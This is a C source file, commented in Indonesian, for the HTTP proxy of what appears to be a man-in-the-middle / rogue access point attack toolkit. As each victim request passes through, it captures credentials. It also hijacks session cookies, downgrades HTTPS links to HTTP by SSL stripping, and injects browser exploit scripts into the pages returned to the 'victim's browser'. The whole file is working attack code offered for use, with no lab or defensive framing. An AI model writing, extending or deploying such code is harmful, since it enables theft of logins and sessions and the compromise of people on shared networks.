// ============================================================================
// IMPLEMENTASI: mitm/proxy.c — Jantung Intersepsi Proxy HTTP
// ============================================================================
#include "proxy.h"
#include "capture.h"
#include "session_hijack.h"
#include "browser_exploit.h"
#include "../server/ssl_strip.h"
#include "../filter/filter.h"
#include "../utils/logger.h"
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <pthread.h>

static int g_sock = -1;
static volatile int g_running = 0;
static ap_config_t *g_cfg = NULL;

/*
 * === FUNGSI: handle_client() ===
 * Tujuan   : Menangani satu sesi koneksi HTTP client dari awal hingga akhir
 * Catatan  : Mematuhi Fix #3 (Cap mlen pada buffer 16384 bytes)
 */
static void handle_client(int cs) {
    char buf[8192] = {0};
    int n = recv(cs, buf, sizeof(buf) - 1, 0);
    if (n <= 0) { close(cs); return; }

    // 1. Selalu lakukan capture kredensial dari data request
    capture_http((uint8_t*)buf, n);

    // 2. Ambil nilai header Host:
    char host[256] = {0};
    char *h = strstr(buf, "Host: ");
    if (h) {
        h += 6; 
        int i = 0;
        while (*h && *h != '\r' && *h != '\n' && i < 255) host[i++] = *h++;
    }
    if (strlen(host) == 0) { close(cs); return; }

    // 3. Periksa aturan filter
    if (filter_match(host) > 0) {
        const char *b = "HTTP/1.1 403 Forbidden\r\nContent-Length: 0\r\n\r\n";
        send(cs, b, strlen(b), 0);
        close(cs); 
        return;
    }

    // 4. Resolve domain asli dan teruskan permintaan ke server target
    struct hostent *he = gethostbyname(host);
    if (!he) { close(cs); return; }
    int rs = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in ra;
    memset(&ra, 0, sizeof(ra));
    ra.sin_family = AF_INET;
    ra.sin_port = htons(80);
    memcpy(&ra.sin_addr, he->h_addr_list[0], he->h_length);
    if (connect(rs, (struct sockaddr*)&ra, sizeof(ra)) < 0) {
        close(rs); close(cs); return;
    }
    send(rs, buf, n, 0);

    // 5. Terima balasan dari server asli
    char resp[16384] = {0}; // FIX #3: Inisialisasi nol agar null-terminated
    int rlen = recv(rs, resp, sizeof(resp) - 1, 0);

    if (rlen > 0) {
        uint8_t mod[32768];
        int mlen = rlen;

        // Penyadapan Cookie Sesi dari respon asli
        if (g_cfg && g_cfg->session_hijack_enabled) {
            session_hijack_process((uint8_t*)resp, rlen);
        }

        // Penurunan HTTPS -> HTTP (SSL Strip)
        if (g_cfg && g_cfg->ssl_strip_enabled) {
            ssl_strip_process((uint8_t*)resp, rlen, mod, &mlen);
            // FIX #3: Batasi mlen secara ketat agar tidak overflow ke dalam resp
            if (mlen > (int)sizeof(resp) - 1) mlen = sizeof(resp) - 1;
            memcpy(resp, mod, mlen);
            rlen = mlen;
        }

        // Penyuntikan Skrip Browser Exploit
        if (g_cfg && g_cfg->browser_exploit_enabled) {
            browser_exploit_inject((uint8_t*)resp, rlen, mod, &mlen);
            // FIX #3: Batasi mlen secara ketat agar tidak overflow ke dalam resp
            if (mlen > (int)sizeof(resp) - 1) mlen = sizeof(resp) - 1;
            memcpy(resp, mod, mlen);
            rlen = mlen;
        }

        // Kembalikan data yang telah dimanipulasi ke browser korban
        send(cs, resp, rlen, 0);
    }
    close(rs); 
    close(cs);
}

/*
 * === FUNGSI: proxy_thread() ===
 * Tujuan   : Thread listener TCP port 8080 proxy HTTP
 */
static void *proxy_thread(void *arg) {
    ap_config_t *cfg = (ap_config_t*)arg;
    g_cfg = cfg;
    int port = cfg->proxy_port > 0 ? cfg->proxy_port : 8080;
    struct sockaddr_in addr, cl;
    socklen_t cl_len = sizeof(cl);
    int opt = 1;

    g_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (g_sock < 0) { g_running = 0; return NULL; }
    setsockopt(g_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(port);
    if (bind(g_sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(g_sock); g_sock = -1;
        g_running = 0;
        perror("bind proxy"); return NULL;
    }
    listen(g_sock, 10);
    log_event(LOG_INFO, "Proxy HTTP aktif di port %d", port);

    while (g_running) {
        int cs = accept(g_sock, (struct sockaddr*)&cl, &cl_len);
        if (cs < 0) continue;
        handle_client(cs);
    }
    return NULL;
}

/*
 * === FUNGSI: proxy_start() ===
 * Tujuan   : Meluncurkan thread server proxy
 */
int proxy_start(ap_config_t *cfg) {
    if (g_running) return 0;
    g_running = 1;
    pthread_t tid;
    if (pthread_create(&tid, NULL, proxy_thread, cfg) != 0) {
        g_running = 0;
        log_event(LOG_ERROR, "Gagal membuat thread proxy");
        return -1;
    }
    pthread_detach(tid);
    return 0;
}

/*
 * === FUNGSI: proxy_stop() ===
 * Tujuan   : Menghentikan server proxy
 */
int proxy_stop(void) {
    g_running = 0;
    if (g_sock >= 0) { close(g_sock); g_sock = -1; }
    return 0;
}
